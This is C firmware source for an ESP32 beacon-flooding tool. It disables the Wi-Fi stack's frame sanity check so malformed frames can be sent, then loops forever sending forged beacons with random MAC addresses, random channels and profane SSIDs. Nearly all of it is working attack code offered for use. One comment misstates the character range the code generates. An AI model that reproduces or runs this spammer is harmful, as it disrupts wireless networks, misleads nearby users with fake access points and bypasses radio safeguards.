#include <string.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_log.h"
#include "esp_log_level.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nvs_flash.h"
#include "driver/gpio.h"
#include "esp_wifi_default.h"
#include "esp_netif_defaults.h"
#include "esp_random.h"
#include "config.h"

// 强制禁用802.11帧校验（允许发送非法帧）来自 https://github.com/risinek/esp32-wifi-penetration-tool/blob/master/components/wsl_bypasser/wsl_bypasser.c
// Force disable 802.11 frame validation (allows sending malformed frames) from https://github.com/risinek/esp32-wifi-penetration-tool/blob/master/components/wsl_bypasser/wsl_bypasser.c

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}
#define TAG "Beacon_Spammer"
// Skid from https://github.com/Tnze/esp32_beaconSpam/blob/master/esp32_beaconSpam/esp32_beaconSpam.ino

static const char* beacon_name[] = {
    "sh1t","fuckyou",TARGET_SSID,"LLL","ERROR","exception","b1tch","d1ck"
};

// 信标帧模板定义（IEEE802.11管理帧结构）
// Beacon frame template definition (IEEE802.11 management frame structure)
uint8_t beaconPacket[109] = {
  /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
  /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source

  // Fixed parameters
  /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
  /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
  /* 32 - 33 */ 0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
  /* 34 - 35 */ 0x21, 0x00, // capabilities Tnformation

  // Tagged parameters

  // SSID parameters
  /* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
  /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, // SSID

  // Supported Rates
  /* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
  /* 72 */ 0x82, // 1(B)
  /* 73 */ 0x84, // 2(B)
  /* 74 */ 0x8b, // 5.5(B)
  /* 75 */ 0x96, // 11(B)
  /* 76 */ 0x24, // 18
  /* 77 */ 0x30, // 24
  /* 78 */ 0x48, // 36
  /* 79 */ 0x6c, // 54

  // Current Channel
  /* 80 - 81 */ 0x03, 0x01, // Channel set, length
  /* 82 */      0x01,       // Current Channel

  // RSN information
  /*  83 -  84 */ 0x30, 0x18,
  /*  85 -  86 */ 0x01, 0x00,
  /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
  /*  91 -  92 */ 0x02, 0x00,
  /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
  /* 101 - 102 */ 0x01, 0x00,
  /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
  /* 107 - 108 */ 0x00, 0x00
};

/**
 * @brief 信标洪水攻击任务 | Beacon flooder task
 * @param arg 任务参数（未使用）| Task parameters (unused)
 * 生成随机BSSID和变异SSID，持续发送伪造信标帧 | Generates random BSSID and mutated SSID, continuously sends forged beacon frames
 */
void beacon_spam_task(void *arg) {
    ESP_LOGI(TAG,"Starting beacon spammer");
    char name_buffer[SSID_MAX_LEN + 1];
    char suffix_buffer[16] = {0};
    
    // 预计算数据包字段指针 | Precompute pointers to frequently accessed packet fields
    uint8_t *ssid_ptr = beaconPacket + 38;
    uint8_t *channel_ptr = beaconPacket + 82;
    uint8_t *bssid_ptr = beaconPacket + 10;
    
    while(1){
        // 生成随机MAC地址 | Generate random BSSID
        esp_fill_random(bssid_ptr, MAC_LEN);
        memcpy(beaconPacket + 16, bssid_ptr, MAC_LEN);
        
        // Generate random suffix
        suffix_buffer[0] = '-';
        for(int i = 1; i < 15; i++)
            suffix_buffer[i] = esp_random() % 79 + 48; // 0x20-0x7E range
        
        // Generate SSID with bounds checking
        snprintf(name_buffer, sizeof(name_buffer), "%s%s", 
                beacon_name[esp_random() % 8], suffix_buffer);
        
        // Update beacon packet
        size_t ssid_len = strnlen(name_buffer, SSID_MAX_LEN);
        memcpy(ssid_ptr, name_buffer, ssid_len);
        beaconPacket[37] = ssid_len;
        
        // Random channel selection with uniform distribution
        *channel_ptr = esp_random() % (CHANNEL_MAX - CHANNEL_MIN + 1) + CHANNEL_MIN;
        
        // Transmit packets
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 109, 0);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

void start_beacon_spam_task() {
    xTaskCreate(&beacon_spam_task, "beacon_spam_task", 4096, NULL, 3, NULL);
}